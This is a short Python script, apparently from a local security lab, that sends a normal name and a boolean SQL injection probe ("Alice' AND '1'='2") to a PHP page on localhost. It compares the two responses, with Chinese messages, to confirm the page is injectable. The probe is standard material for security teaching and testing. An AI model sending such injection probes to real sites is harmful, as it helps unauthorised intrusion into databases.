import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:4280/lab_cases/S007/index.php"


def fetch(name: str) -> str:
    url = BASE + "?" + urllib.parse.urlencode({"name": name})
    with urllib.request.urlopen(url, timeout=5) as resp:
        return resp.read().decode("utf-8", "replace")


def main() -> None:
    normal_input = "Alice"
    test_input = "Alice' AND '1'='2"
    normal_resp = fetch(normal_input)
    test_resp = fetch(test_input)
    print("普通输入响应片段：")
    print(normal_resp[:800])
    print("\n测试输入响应片段：")
    print(test_resp[:800])
    normal_ok = ("ID 1" in normal_resp and "Alice" in normal_resp)
    test_changed = ("ID 1" not in test_resp and "Alice" not in test_resp)
    if normal_ok and test_changed:
        print("\n[观察] 普通输入返回 Alice 行，测试输入未返回该行；结果条件发生变化。")
    else:
        print("\n[未确认] 未观察到预期差异，请检查服务监听、入口路径、bootstrap 连接和 lab_people 初始化。")


if __name__ == "__main__":
    main()
